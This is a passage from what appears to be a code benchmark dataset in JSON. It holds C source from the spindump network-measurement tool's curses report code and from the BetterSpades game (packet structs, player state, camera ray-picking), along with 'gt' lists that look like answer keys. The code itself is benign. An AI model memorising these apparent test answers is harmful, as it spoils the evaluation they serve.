spindump_connection_transport_udp &&\n              connection->type != spindump_connection_transport_dns) ||\n             udp) &&\n            (!spindump_connections_isclosed(connection) || closed) &&\n            spindump_connections_isaggregate(connection) == aggregate) {\n          actualTable[actualConnections++] = connection;\n        }\n      }\n\n\n\n\n\n      spindump_deepdebugf(\"report sorting\");\n      qsort(&actualTable[0],\n            (size_t)actualConnections,\n            sizeof(struct spindump_connection*),\n            spindump_report_update_comparetwoconnections);\n\n\n\n\n\n      spindump_deepdebugf(\"report displaying\");\n      int j;\n      for (j = 0; j < actualConnections; j++) {\n        char connectionbuf[spindump_report_maxlinelen];\n        spindump_assert(actualTable[j] != 0);\n        spindump_deepdebugf(\"report displaying connection %u\", actualTable[j]->id);\n        spindump_connection_report_brief(actualTable[j],\n                                         connectionbuf,\n                                         sizeof(connectionbuf),\n                                         average,\n                                         (unsigned int)COLS,\n                                         reporter->anonymizeLeft,\n                                         reporter->anonymizeRight,\n                                         reporter->querier);\n        mvaddstr(y++, 0, connectionbuf);\n\n      }\n    }\n\n    spindump_deepdebugf(\"report refreshing\");\n    refresh();\n\n  }\n\n}\n\n\n\n\n\nstatic\nvoid spindump_report_putcurrentinputonscreen(struct spindump_report_state* reporter,\n                                             const char* string,\n                                             const char* value) {\n  for (int i = 0;\n       i < COLS;\n       i++) {\n    mvaddstr(reporter->inputlineposition, i, \" \");\n  }\n  mvaddstr(reporter->inputlineposition, 0, string);\n  mvaddstr(reporter->inputlineposition, (int)(strlen(string)), value);\n  refresh();\n}\n\n\n\n\n\nstatic\nvoid spindump_report_puterroronscreen(struct spindump_report_state* reporter,\n                                      const char* string) {\n  spindump_report_putcurrentinputonscreen(reporter,\"Error: \",string);\n}\n\n\n\n\n\nstatic\nint\nspindump_report_checkinput_updateinterval(struct spindump_report_state* reporter,\n                                          double* p_argument) {\n  spindump_report_putcurrentinputonscreen(reporter,\"interval: \",\"\");\n  int ch;\n  char buf[20];\n  memset(buf,0,sizeof(buf));\n  while ((ch = getch()) != '\\n' && ch != '\\r' && strlen(buf) < sizeof(buf)-1) {\n    if (ch != ERR) {\n      buf[strlen(buf)] = (char)ch;\n      spindump_report_putcurrentinputonscreen(reporter,\"interval: \",buf);\n      spindump_deepdebugf(\"spindump_report_checkinput_updateinterval current interval string is %s\", buf);\n    }\n  }\n  spindump_report_putcurrentinputonscreen(reporter,\"\",\"\");\n  double interval = atof(buf);\n  if (interval == 0.0) {\n    spindump_report_puterroronscreen(reporter,\"invalid interval, must be a floating point number\");\n    return(0);\n  } else if (interval < 0.0) {\n    spindump_report_puterroronscreen(reporter,\"invalid interval, must be positive\");\n    return(0);\n  } else if (interval < 0.1) {\n    spindump_report_puterroronscreen(reporter,\"invalid interval, must be at least 0.1s\");\n    return(0);\n  } else {\n    *p_argument = interval;\n    spindump_deepdebugf(\"spindump_report_checkinput_updateinterval interval is %f\", interval);\n    return(1);\n  }\n}\n\n\n\n\n\n\n\n\n\n\nenum spindump_report_command\nspindump_report_checkinput(struct spindump_report_state* reporter,\n                           double* p_argument) {\n\n  int ch;\n\n  if ((ch = getch()) == ERR) {\n\n    return(spindump_report_command_none);\n\n  } else {\n\n    char c = (char)(tolower((char)ch));\n    switch (c) {\n    case 'q': return(spindump_report_command_quit);\n    case 'h': return(spindump_report_command_help);\n    case 'g': return(spindump_report_command_toggle_average);\n    case 'a': return(spindump_report_command_toggle_aggregate);\n    case 'c': return(spindump_report_command_toggle_closed);\n    case 'u': return(spindump_report_command_toggle_udp);\n    case 's':\n      if (spindump_report_checkinput_updateinterval(reporter,p_argument)) {\n        return(spindump_report_command_update_interval);\n      } else {\n        return(spindump_report_command_none);\n      }\n    case 'n': return(spindump_report_command_toggle_reverse_dns);\n\n    default: return(spindump_report_command_none);\n    }\n\n  }\n\n}\n\n\n\n\n\nvoid\nspindump_report_showhelp(struct spindump_report_state* reporter) {\n\n  int y = 0;\n  int ch;\n\n  clear();\n\n  if (LINES < 10 || COLS < 40) {\n\n    mvaddstr(y++, 0, \"TOO SMALL\");\n\n  } else {\n\n    mvaddstr(y++, 0, \"SPINDUMP   \");\n    mvaddstr(y++, 0, \"\");\n    mvaddstr(y++, 0, \"USAGE:\");\n    mvaddstr(y++, 0, \"\");\n    mvaddstr(y++, 0, \"The tool shows active sessions. Screen updates\");\n    mvaddstr(y++, 0, \"automatically as packets pass by.\");\n    mvaddstr(y++, 0, \"\");\n    mvaddstr(y++, 0, \"You can also use these keys:\");\n    mvaddstr(y++, 0, \"\");\n    mvaddstr(y++, 0, \"    G     Toggle average RTT mode, showing either the\");\n    mvaddstr(y++, 0, \"          latest RTT measurements or a moving average.\");\n    mvaddstr(y++, 0, \"    A     Toggle aggregate mode, showing either\");\n    mvaddstr(y++, 0, \"          connections or host pairs.\");\n    mvaddstr(y++, 0, \"    C     Toggle showing of closed connections\");\n    mvaddstr(y++, 0, \"    U     Toggle showing of UDP connections\");\n    mvaddstr(y++, 0, \"    N     Toggle showing addresses vs. names\");\n    mvaddstr(y++, 0, \"    S     Set the update period\");\n    mvaddstr(y++, 0, \"    H     Display a help screen\");\n    mvaddstr(y++, 0, \"    Q     Quit\");\n    mvaddstr(y++, 0, \"\");\n    mvaddstr(y++, 0, \"\");\n    mvaddstr(y++, 0, \"Press any key to continue\");\n    mvaddstr(y++, 0, \"\");\n\n  }\n\n  refresh();\n  while ((ch = getch()) == ERR);\n}\n\n\n\n\n\n\nvoid\nspindump_report_uninitialize(struct spindump_report_state* reporter) {\n\n\n\n\n\n  spindump_assert(reporter != 0);\n  spindump_assert(reporter->querier != 0);\n\n\n\n\n\n  if (reporter->destination == spindump_report_destination_quiet) {\n    spindump_reverse_dns_uninitialize(reporter->querier);\n  }\n\n\n\n\n\n  switch (reporter->destination) {\n  case spindump_report_destination_quiet:\n    break;\n  case spindump_report_destination_terminal:\n    spindump_report_cursesfinish();\n    break;\n  default:\n    spindump_errorf(\"invalid reporter destination\");\n    break;\n  }\n\n\n\n\n\n\n  memset(reporter,0xFF,sizeof(*reporter));\n  spindump_free(reporter);\n}\n",
        "gt": [
            "'spindump/src/spindump_table_structs.h'",
            "'spindump/src/spindump_table.h'",
            "'spindump/src/spindump_report.h'",
            "'spindump/src/spindump_report.c'"
        ]
    },
    {
        "files": [
            "'BetterSpades/src/network.h'",
            "'BetterSpades/src/player.h'",
            "'BetterSpades/src/camera.c'"
        ],
        "content": "'BetterSpades/src/network.h'\n:\n\n#ifndef NETWORK_H\n#define NETWORK_H\n\nconst char* network_reason_disconnect(int code);\n\nunsigned int network_ping(void);\nvoid network_send(int id, void* data, int len);\nvoid network_updateColor(void);\nvoid network_disconnect(void);\nint network_identifier_split(char* addr, char* ip_out, int* port_out);\nint network_connect(char* ip, int port);\nint network_connect_string(char* addr);\nint network_update(void);\nint network_status(void);\nvoid network_init(void);\n\nvoid read_PacketMapChunk(void* data, int len);\nvoid read_PacketChatMessage(void* data, int len);\nvoid read_PacketBlockAction(void* data, int len);\nvoid read_PacketBlockLine(void* data, int len);\nvoid read_PacketStateData(void* data, int len);\nvoid read_PacketFogColor(void* data, int len);\nvoid read_PacketExistingPlayer(void* data, int len);\nvoid read_PacketCreatePlayer(void* data, int len);\nvoid read_PacketPlayerLeft(void* data, int len);\nvoid read_PacketMapStart(void* data, int len);\nvoid read_PacketWorldUpdate(void* data, int len);\nvoid read_PacketPositionData(void* data, int len);\nvoid read_PacketOrientationData(void* data, int len);\nvoid read_PacketSetColor(void* data, int len);\nvoid read_PacketInputData(void* data, int len);\nvoid read_PacketWeaponInput(void* data, int len);\nvoid read_PacketSetTool(void* data, int len);\nvoid read_PacketKillAction(void* data, int len);\nvoid read_PacketShortPlayerData(void* data, int len);\nvoid read_PacketGrenade(void* data, int len);\nvoid read_PacketSetHP(void* data, int len);\nvoid read_PacketRestock(void* data, int len);\nvoid read_PacketChangeWeapon(void* data, int len);\nvoid read_PacketWeaponReload(void* data, int len);\nvoid read_PacketMoveObject(void* data, int len);\nvoid read_PacketIntelCapture(void* data, int len);\nvoid read_PacketIntelDrop(void* data, int len);\nvoid read_PacketIntelPickup(void* data, int len);\nvoid read_PacketTerritoryCapture(void* data, int len);\nvoid read_PacketProgressBar(void* data, int len);\nvoid read_PacketHandshakeInit(void* data, int len);\nvoid read_PacketVersionGet(void* data, int len);\n\nextern void (*packets[256])(void* data, int len);\nextern int network_connected;\nextern int network_logged_in;\nextern int network_map_transfer;\nextern int network_received_packets;\n\nextern float network_pos_update;\nextern float network_orient_update;\nextern unsigned char network_keys_last;\nextern unsigned char network_buttons_last;\nextern unsigned char network_tool_last;\n\n#define VERSION_075 3\n#define VERSION_076 4\n\nextern void* compressed_chunk_data;\nextern int compressed_chunk_data_size;\nextern int compressed_chunk_data_offset;\nextern int compressed_chunk_data_estimate;\n\nextern struct network_stat {\n\tint outgoing;\n\tint ingoing;\n\tint avg_ping;\n} network_stats[40];\n\nextern float network_stats_last;\n\n#pragma pack(push, 1)\n\n#define PACKET_HANDSHAKEINIT_ID 31\nstruct PacketHandshakeInit {\n\tint challenge;\n};\n\n#define PACKET_HANDSHAKERETURN_ID 32\nstruct PacketHandshakeReturn {\n\tint challenge;\n};\n\n#define PACKET_VERSIONGET_ID 33\n\n#define PACKET_VERSIONSEND_ID 34\nstruct PacketVersionSend {\n\tunsigned char client;\n\tunsigned char major, minor, revision;\n\tchar operatingsystem[64];\n};\n\n#define PACKET_MAPCHUNK_ID 19\n\n#define PACKET_POSITIONDATA_ID 0\nstruct PacketPositionData {\n\tfloat x, y, z;\n};\n\n#define PACKET_ORIENTATIONDATA_ID 1\nstruct PacketOrientationData {\n\tfloat x, y, z;\n};\n\n#define PACKET_WORLDUPDATE_ID 2\nstruct PacketWorldUpdate075 {\n\tfloat x, y, z;\n\tfloat ox, oy, oz;\n};\n\nstruct PacketWorldUpdate076 {\n\tunsigned char player_id;\n\tfloat x, y, z;\n\tfloat ox, oy, oz;\n};\n\n#define PACKET_INPUTDATA_ID 3\nstruct PacketInputData {\n\tunsigned char player_id;\n\tunsigned char keys;\n};\n\n#define PACKET_WEAPONINPUT_ID 4\nstruct PacketWeaponInput {\n\tunsigned char player_id;\n\tunsigned char primary : 1;\n\tunsigned char secondary : 1;\n};\n\n#define PACKET_MOVEOBJECT_ID 11\nstruct PacketMoveObject {\n\tunsigned char object_id;\n\tunsigned char team;\n\tfloat x, y, z;\n};\n#define TEAM_1_FLAG 0\n#define TEAM_2_FLAG 1\n#define TEAM_1_BASE 2\n#define TEAM_2_BASE 3\n\n#define PACKET_INTELPICKUP_ID 24\nstruct PacketIntelPickup {\n\tunsigned char player_id;\n};\n\n#define PACKET_INTELCAPTURE_ID 23\nstruct PacketIntelCapture {\n\tunsigned char player_id;\n\tunsigned char winning;\n};\n\n#define PACKET_INTELDROP_ID 25\nstruct PacketIntelDrop {\n\tunsigned char player_id;\n\tfloat x, y, z;\n};\n\n#define PACKET_WEAPONRELOAD_ID 28\nstruct PacketWeaponReload {\n\tunsigned char player_id;\n\tunsigned char ammo;\n\tunsigned char reserved;\n};\n\n#define PACKET_SETHP_ID 5\nstruct PacketSetHP {\n\tunsigned char hp;\n\tunsigned char type;\n\tfloat x, y, z;\n};\n#define DAMAGE_SOURCE_FALL 0\n#define DAMAGE_SOURCE_GUN 1\n\n#define PACKET_HIT_ID 5\nstruct PacketHit {\n\tunsigned char player_id;\n\tunsigned char hit_type;\n};\n#define HITTYPE_TORSO 0\n#define HITTYPE_HEAD 1\n#define HITTYPE_ARMS 2\n#define HITTYPE_LEGS 3\n#define HITTYPE_SPADE 4\n\n#define PACKET_KILLACTION_ID 16\nstruct PacketKillAction {\n\tunsigned char player_id;\n\tunsigned char killer_id;\n\tunsigned char kill_type;\n\tunsigned char respawn_time;\n};\n#define KILLTYPE_WEAPON 0\n#define KILLTYPE_HEADSHOT 1\n#define KILLTYPE_MELEE 2\n#define KILLTYPE_GRENADE 3\n#define KILLTYPE_FALL 4\n#define KILLTYPE_TEAMCHANGE 5\n#define KILLTYPE_CLASSCHANGE 6\n\n#define PACKET_RESTOCK_ID 26\nstruct PacketRestock {\n\tunsigned char player_id;\n};\n\n#define PACKET_GRENADE_ID 6\nstruct PacketGrenade {\n\tunsigned char player_id;\n\tfloat fuse_length;\n\tfloat x, y, z;\n\tfloat vx, vy, vz;\n};\n\n#define PACKET_MAPSTART_ID 18\nstruct PacketMapStart075 {\n\tunsigned int map_size;\n};\nstruct PacketMapStart076 {\n\tunsigned int map_size;\n\tunsigned int crc32;\n\tchar map_name[64];\n};\n\n#define PACKET_MAPCACHED_ID 31\nstruct PacketMapCached {\n\tunsigned char cached;\n};\n\n#define PACKET_PLAYERLEFT_ID 20\nstruct PacketPlayerLeft {\n\tunsigned char player_id;\n};\n\n#define PACKET_EXISTINGPLAYER_ID 9\nstruct PacketExistingPlayer {\n\tunsigned char player_id;\n\tunsigned char team;\n\tunsigned char weapon;\n\tunsigned char held_item;\n\tunsigned int kills;\n\tunsigned char blue, green, red;\n\tchar name[17];\n};\n#define WEAPON_RIFLE 0\n#define WEAPON_SMG 1\n#define WEAPON_SHOTGUN 2\n\n#define PACKET_CREATEPLAYER_ID 12\nstruct PacketCreatePlayer {\n\tunsigned char player_id;\n\tunsigned char weapon;\n\tunsigned char team;\n\tfloat x, y, z;\n\tchar name[17];\n};\n\n#define PACKET_BLOCKACTION_ID 13\nstruct PacketBlockAction {\n\tunsigned char player_id;\n\tunsigned char action_type;\n\tint x, y, z;\n};\n#define ACTION_BUILD 0\n#define ACTION_DESTROY 1\n#define ACTION_SPADE 2\n#define ACTION_GRENADE 3\n\n#define PACKET_BLOCKLINE_ID 14\nstruct PacketBlockLine {\n\tunsigned char player_id;\n\tint sx, sy, sz;\n\tint ex, ey, ez;\n};\n\n#define PACKET_SETCOLOR_ID 8\nstruct PacketSetColor {\n\tunsigned char player_id;\n\tunsigned char blue, green, red;\n};\n\n#define PACKET_SHORTPLAYERDATA_ID 10\nstruct PacketShortPlayerData {\n\tunsigned char player_id;\n\tunsigned char team;\n\tunsigned char weapon;\n};\n\n#define PACKET_SETTOOL_ID 7\nstruct PacketSetTool {\n\tunsigned char player_id;\n\tunsigned char tool;\n};\n#define TOOL_SPADE 0\n#define TOOL_BLOCK 1\n#define TOOL_GUN 2\n#define TOOL_GRENADE 3\n\n#define PACKET_CHATMESSAGE_ID 17\nstruct PacketChatMessage {\n\tunsigned char player_id;\n\tunsigned char chat_type;\n\tchar message[255];\n};\n#define CHAT_ALL 0\n#define CHAT_TEAM 1\n#define CHAT_SYSTEM 2\n#define CHAT_BIG 3\n#define CHAT_INFO 4\n#define CHAT_WARNING 5\n#define CHAT_ERROR 6\n\n#define PACKET_FOGCOLOR_ID 27\nstruct PacketFogColor {\n\tunsigned char alpha, blue, green, red;\n};\n\n#define PACKET_CHANGETEAM_ID 29\nstruct PacketChangeTeam {\n\tunsigned char player_id;\n\tunsigned char team;\n};\n\n#define PACKET_CHANGEWEAPON_ID 30\nstruct PacketChangeWeapon {\n\tunsigned char player_id;\n\tunsigned char weapon;\n};\n\n#define PACKET_STATEDATA_ID 15\nstruct PacketStateData {\n\tunsigned char player_id;\n\tunsigned char fog_blue, fog_green, fog_red;\n\tunsigned char team_1_blue, team_1_green, team_1_red;\n\tunsigned char team_2_blue, team_2_green, team_2_red;\n\tchar team_1_name[10];\n\tchar team_2_name[10];\n\tunsigned char gamemode;\n\n\tunion Gamemodes {\n\t\tstruct GM_CTF {\n\t\t\tunsigned char team_1_score;\n\t\t\tunsigned char team_2_score;\n\t\t\tunsigned char capture_limit;\n\t\t\tunsigned char team_1_intel : 1;\n\t\t\tunsigned char team_2_intel : 1;\n\t\t\tunion intel_location {\n\t\t\t\tstruct {\n\t\t\t\t\tunsigned char player_id;\n\t\t\t\t\tunsigned char padding[11];\n\t\t\t\t} held;\n\t\t\t\tstruct {\n\t\t\t\t\tfloat x, y, z;\n\t\t\t\t} dropped;\n\t\t\t} team_1_intel_location;\n\t\t\tunion intel_location team_2_intel_location;\n\t\t\tstruct {\n\t\t\t\tfloat x, y, z;\n\t\t\t} team_1_base;\n\t\t\tstruct {\n\t\t\t\tfloat x, y, z;\n\t\t\t} team_2_base;\n\t\t} ctf;\n\n\t\tstruct GM_TC {\n\t\t\tunsigned char territory_count;\n\t\t\tstruct {\n\t\t\t\tfloat x, y, z;\n\t\t\t\tunsigned char team;\n\t\t\t} territory[16];\n\t\t} tc;\n\t} gamemode_data;\n};\n\n#define PACKET_TERRITORYCAPTURE_ID 21\nstruct PacketTerritoryCapture {\n\tunsigned char tent, winning, team;\n};\n\n#define PACKET_PROGRESSBAR_ID 22\nstruct PacketProgressBar {\n\tunsigned char tent;\n\tunsigned char team_capturing;\n\tchar rate;\n\tfloat progress;\n};\n\n#define PACKET_EXTINFO_ID 60\nstruct PacketExtInfo {\n\tunsigned char length;\n\tstruct PacketExtInfoEntry {\n\t\tunsigned char id;\n\t\tunsigned char version;\n\t} entries[256];\n};\n\nstruct PacketPlayerProperties {\n\tuint8_t subID;\n\tuint8_t player_id;\n\tuint8_t health;\n\tuint8_t blocks;\n\tuint8_t grenades;\n\tuint8_t ammo_clip;\n\tuint8_t ammo_reserved;\n\tuint32_t score;\n};\n\n#define PACKET_EXT_BASE 0x40\n\nenum Extension {\n\tEXT_PLAYER_PROPERTIES = 0x00,\n\tEXT_256PLAYERS = 0xC0,\n\tEXT_MESSAGES = 0xC1,\n\tEXT_KICKREASON = 0xC2,\n};\n\n#pragma pack(pop)\n\n#endif\n\n'BetterSpades/src/player.h'\n:\n\n#ifndef PLAYER_H\n#define PLAYER_H\n\n#include <stdbool.h>\n\n#include \"aabb.h\"\n#include \"network.h\"\n\n#define PLAYERS_MAX 256\n#define TEAM_1 0\n#define TEAM_2 1\n#define TEAM_SPECTATOR 255\n\nextern struct GameState {\n\tstruct Team {\n\t\tchar name[11];\n\t\tunsigned char red, green, blue;\n\t} team_1;\n\tstruct Team team_2;\n\tunsigned char gamemode_type;\n\tunion Gamemodes gamemode;\n\tstruct {\n\t\tunsigned char team_capturing, tent;\n\t\tfloat progress, rate, update;\n\t} progressbar;\n} gamestate;\n\n#define GAMEMODE_CTF 0\n#define GAMEMODE_TC 1\n\nextern int button_map[3];\n\nextern unsigned char local_player_id;\nextern unsigned char local_player_health;\nextern unsigned char local_player_blocks;\nextern unsigned char local_player_grenades;\nextern unsigned char local_player_ammo, local_player_ammo_reserved;\nextern unsigned char local_player_respawn_time;\nextern float local_player_death_time;\nextern unsigned char local_player_respawn_cnt_last;\nextern unsigned char local_player_newteam;\nextern unsigned char local_player_lasttool;\n\nextern float local_player_last_damage_timer;\nextern float local_player_last_damage_x;\nextern float local_player_last_damage_y;\nextern float local_player_last_damage_z;\n\nextern char local_player_drag_active;\nextern int local_player_drag_x;\nextern int local_player_drag_y;\nextern int local_player_drag_z;\n\nextern int player_intersection_type;\nextern int player_intersection_player;\nextern float player_intersection_dist;\n\nstruct player_intersection {\n\tbool head;\n\tbool torso;\n\tbool leg_left;\n\tbool leg_right;\n\tbool arms;\n\tunion {\n\t\tstruct {\n\t\t\tfloat head;\n\t\t\tfloat torso;\n\t\t\tfloat leg_left;\n\t\t\tfloat leg_right;\n\t\t\tfloat arms;\n\t\t};\n\t\tfloat values[5];\n\t} distance;\n};\n\nbool player_intersection_exists(struct player_intersection* s);\nint player_intersection_choose(struct player_intersection* s, float* distance);\n\nextern struct Player {\n\tchar name[17];\n\tstruct Position {\n\t\tfloat x, y, z;\n\t} pos;\n\tstruct Orientation {\n\t\tfloat x, y, z;\n\t} orientation;\n\tAABB bb_2d;\n\tstruct Orientation orientation_smooth;\n\tstruct Position gun_pos;\n\tstruct Position casing_dir;\n\tfloat gun_shoot_timer;\n\tint ammo, ammo_reserved;\n\tfloat spade_use_timer;\n\tunsigned char spade_used, spade_use_type;\n\tunsigned int score;\n\tunsigned char team, weapon, held_item;\n\tunsigned char alive, connected;\n\tfloat item_showup, item_disabled, items_show_start;\n\tunsigned char items_show;\n\tunion {\n\t\tunsigned int packed;\n\t\tstruct {\n\t\t\tunsigned char red, green, blue;\n\t\t};\n\t} block;\n\tstruct {\n\t\tunion {\n\t\t\tunsigned char packed;\n\t\t\tstruct {\n\t\t\t\tunsigned char up : 1;\n\t\t\t\tunsigned char down : 1;\n\t\t\t\tunsigned char left : 1;\n\t\t\t\tunsigned char right : 1;\n\t\t\t\tunsigned char jump : 1;\n\t\t\t\tunsigned char crouch : 1;\n\t\t\t\tunsigned char sneak : 1;\n\t\t\t\tunsigned char sprint : 1;\n\t\t\t};\n\t\t} keys;\n\t\tunion {\n\t\t\tunsigned char packed;\n\t\t\tstruct {\n\t\t\t\tunsigned char lmb : 1;\n\t\t\t\tunsigned char rmb : 1;\n\t\t\t\tfloat lmb_start, rmb_start;\n\t\t\t};\n\t\t} buttons;\n\t} input;\n\n\tstruct {\n\t\tunsigned char jump, airborne, wade;\n\t\tfloat lastclimb;\n\t\tstruct Velocity {\n\t\t\tfloat x, y, z;\n\t\t} velocity;\n\t\tstruct Position eye;\n\t} physics;\n\n\tstruct {\n\t\tfloat feet_started, feet_started_cycle;\n\t\tchar feet_cylce;\n\t\tfloat tool_started;\n\t} sound;\n} players[PLAYERS_MAX];\n\n\nvoid player_on_held_item_change(struct Player* p);\nint player_can_spectate(struct Player* p);\nfloat player_section_height(int section);\nvoid player_init(void);\nfloat player_height(const struct Player* p);\nfloat player_height2(const struct Player* p);\nvoid player_reposition(struct Player* p);\nvoid player_update(float dt, int locked);\nvoid player_render_all(void);\nvoid player_render(struct Player* p, int id);\nvoid player_collision(const struct Player* p, Ray* ray, struct player_intersection* intersects);\nvoid player_reset(struct Player* p);\nint player_move(struct Player* p, float fsynctics, int id);\nint player_uncrouch(struct Player* p);\n\n#endif\n\n'BetterSpades/src/camera.c'\n:\n\n#include <math.h>\n#include <string.h>\n#include <float.h>\n\n#include \"common.h\"\n#include \"cameracontroller.h\"\n#include \"player.h\"\n#include \"map.h\"\n#include \"matrix.h\"\n#include \"camera.h\"\n#include \"config.h\"\n\nenum camera_mode camera_mode = CAMERAMODE_SPECTATOR;\n\nfloat frustum[6][4];\nfloat camera_rot_x = 2.04F, camera_rot_y = 1.79F;\nfloat camera_x = 256.0F, camera_y = 60.0F, camera_z = 256.0F;\nfloat camera_vx, camera_vy, camera_vz;\nfloat camera_size = 0.8F;\nfloat camera_height = 0.8F;\nfloat camera_eye_height = 0.0F;\nfloat camera_movement_x = 0.0F, camera_movement_y = 0.0F, camera_movement_z = 0.0F;\nfloat camera_speed = 32.0F;\n\nfloat camera_fov_scaled() {\n\tint render_fpv = (camera_mode == CAMERAMODE_FPS)\n\t\t|| ((camera_mode == CAMERAMODE_BODYVIEW || camera_mode == CAMERAMODE_SPECTATOR)\n\t\t\t&& cameracontroller_bodyview_mode);\n\tint local_id = (camera_mode == CAMERAMODE_FPS) ? local_player_id : cameracontroller_bodyview_player;\n\n\tif(render_fpv && players[local_id].held_item == TOOL_GUN && players[local_id].input.buttons.rmb\n\t   && !players[local_id].input.keys.sprint && players[local_id].alive)\n\t\treturn CAMERA_DEFAULT_FOV * atan(tan((CAMERA_DEFAULT_FOV / 180.0F * PI) / 2) / 2.0F) * 2.0F;\n\treturn settings.camera_fov;\n}\n\nvoid camera_overflow_adjust() {\n\tif(camera_rot_y < EPSILON) {\n\t\tcamera_rot_y = EPSILON;\n\t}\n\n\tif(camera_rot_y > 3.14F) {\n\t\tcamera_rot_y = 3.14F;\n\t}\n\n\tif(camera_rot_x > DOUBLEPI) {\n\t\tcamera_rot_x -= DOUBLEPI;\n\t}\n\n\tif(camera_rot_x < 0.0F) {\n\t\tcamera_rot_x += DOUBLEPI;\n\t}\n}\n\nvoid camera_apply() {\n\tswitch(camera_mode) {\n\t\tcase CAMERAMODE_FPS: cameracontroller_fps_render(); break;\n\t\tcase CAMERAMODE_BODYVIEW: cameracontroller_bodyview_render(); break;\n\t\tcase CAMERAMODE_SPECTATOR: cameracontroller_spectator_render(); break;\n\t\tcase CAMERAMODE_SELECTION: cameracontroller_selection_render(); break;\n\t\tcase CAMERAMODE_DEATH: cameracontroller_death_render(); break;\n\t}\n}\n\nvoid camera_update(float dt) {\n\tswitch(camera_mode) {\n\t\tcase CAMERAMODE_FPS: cameracontroller_fps(dt); break;\n\t\tcase CAMERAMODE_BODYVIEW: cameracontroller_bodyview(dt); break;\n\t\tcase CAMERAMODE_SPECTATOR: cameracontroller_spectator(dt); break;\n\t\tcase CAMERAMODE_SELECTION: cameracontroller_selection(dt); break;\n\t\tcase CAMERAMODE_DEATH: cameracontroller_death(dt); break;\n\t}\n}\n\nvoid camera_hit_fromplayer(struct Camera_HitType* hit, int player_id, float range) {\n\tif(player_id != local_player_id) {\n\t\tcamera_hit(hit, player_id, players[player_id].physics.eye.x,\n\t\t\t\t   players[player_id].physics.eye.y + player_height(&players[player_id]),\n\t\t\t\t   players[player_id].physics.eye.z, players[player_id].orientation.x, players[player_id].orientation.y,\n\t\t\t\t   players[player_id].orientation.z, range);\n\t} else {\n\t\tcamera_hit(hit, player_id, players[player_id].physics.eye.x,\n\t\t\t\t   players[player_id].physics.eye.y + player_height(&players[player_id]),\n\t\t\t\t   players[player_id].physics.eye.z, sin(camera_rot_x) * sin(camera_rot_y), cos(camera_rot_y),\n\t\t\t\t   cos(camera_rot_x) * sin(camera_rot_y), range);\n\t}\n}\n\nvoid camera_hit(struct Camera_HitType* hit, int exclude_player, float x, float y, float z, float ray_x, float ray_y,\n\t\t\t\tfloat ray_z, float range) {\n\tcamera_hit_mask(hit, exclude_player, x, y, z, ray_x, ray_y, ray_z, range);\n}\n\nvoid camera_hit_mask(struct Camera_HitType* hit, int exclude_player, float x, float y, float z, float ray_x,\n\t\t\t\t\t float ray_y, float ray_z, float range) {\n\tRay dir = (Ray) {\n\t\t.origin.coords = {x, y, z},\n\t\t.direction.coords = {ray_x, ray_y, ray_z},\n\t};\n\n\thit->type = CAMERA_HITTYPE_NONE;\n\thit->distance = FLT_MAX;\n\n\tint* pos = camera_terrain_pickEx(1, x, y, z, ray_x, ray_y, ray_z);\n\tif(pos != NULL && distance3D(x, y, z, pos[0], pos[1], pos[2]) <= range * range) {\n\t\tAABB block = (AABB) {\n\t\t\t.min = {pos[0], pos[1], pos[2]},\n\t\t\t.max = {pos[0] + 1, pos[1] + 1, pos[2] + 1},\n\t\t};\n\n\t\tfloat d;\n\t\tif(aabb_intersection_ray(&block, &dir, &d)) {\n\t\t\thit->type = CAMERA_HITTYPE_BLOCK;\n\t\t\thit->distance = d;\n\t\t\thit->x = pos[0];\n\t\t\thit->y = pos[1];\n\t\t\thit->z = pos[2];\n\t\t\thit->xb = pos[3];\n\t\t\thit->yb = pos[4];\n\t\t\thit->zb = pos[5];\n\t\t}\n\t}\n\n\tfor(int i = 0; i < PLAYERS_MAX; i++) {\n\t\tfloat l = distance2D(x, z, players[i].pos.x, players[i].pos.z);\n\t\tif(players[i].connected && players[i].alive && l < range * range\n\t\t   && (exclude_player < 0 || (exclude_player >= 0 && exclude_player != i))) {\n\t\t\tstruct player_intersection intersects = {0};\n\t\t\tplayer_collision(players + i, &dir, &intersects);\n\n\t\t\tfloat d;\n\t\t\tint type = player_intersection_choose(&intersects, &d);\n\t\t\tif(player_intersection_exists(&intersects) && d < hit->distance) {\n\t\t\t\thit->type = CAMERA_HITTYPE_PLAYER;\n\t\t\t\thit->distance = d;\n\t\t\t\thit->x = players[i].pos.x;\n\t\t\t\thit->y = players[i].pos.y;\n\t\t\t\thit->z = players[i].pos.z;\n\t\t\t\thit->player_id = i;\n\t\t\t\thit->player_section = type;\n\t\t\t}\n\t\t}\n\t}\n}\n\nint* camera_terrain_pick(unsigned char mode) {\n\treturn camera_terrain_pickEx(mode, camera_x, camera_y, camera_z, sin(camera_rot_x) * sin(camera_rot_y),\n\t\t\t\t\t\t\t\t cos(camera_rot_y), cos(camera_rot_x) * sin(camera_rot_y));\n}\n\n\n\n\nint* camera_terrain_pickEx(unsigned char mode, float gx0, float gy0, float gz0, float ray_x, float ray_y, float ray_z) {\n\tfloat gx1 = gx0 + ray_x * 128.0F;\n\tfloat gy1 = gy0 + ray_y * 128.0F;\n\tfloat gz1 = gz0 + ray_z * 128.0F;\n\n\tint gx0idx = floor(gx0);\n\tint gy0idx = floor(gy0);\n\tint gz0idx = floor(gz0);\n\n\tint gx1idx = floor(gx1);\n\tint gy1idx = floor(gy1);\n\tint gz1idx = floor(gz1);\n\n\tint sx = gx1idx > gx0idx ? 1 : gx1idx < gx0idx ? -1 : 0;\n\tint sy = gy1idx > gy0idx ? 1 : gy1idx < gy0idx ? -1 : 0;\n\tint sz = gz1idx > gz0idx ? 1 : gz1idx < gz0idx ? -1 : 0;\n\n\tint gx = gx0idx;\n\tint gy = gy0idx;\n\tint gz = gz0idx;\n\n\tint gxp = gx0idx + (gx1idx > gx0idx ? 1 : 0);\n\tint gyp = gy0idx + (gy1idx > gy0idx ? 1 : 0);\n\tint gzp = gz0idx + (gz1idx > gz0idx ? 1 : 0);\n\n\tfloat vx = gx1 == gx0 ? 1 : gx1 - gx0;\n\tfloat vy = gy1 == gy0 ? 1 : gy1 - gy0;\n\tfloat vz = gz1 == gz0 ? 1 : gz1 - gz0;\n\n\tfloat vxvy = vx * vy;\n\tfloat vxvz = vx * vz;\n\tfloat vyvz = vy * vz;\n\n\tfloat errx = (gxp - gx0) * vyvz;\n\tfloat erry = (gyp - gy0) * vxvz;\n\tfloat errz = (gzp - gz0) * vxvy;\n\n\tfloat derrx = sx * vyvz;\n\tfloat derry = sy * vxvz;\n\tfloat derrz = sz * vxvy;\n\n\tint gx_pre = gx, gy_pre = gy, gz_pre = gz;\n\n\tstatic int ret[6];\n\tret[0] = 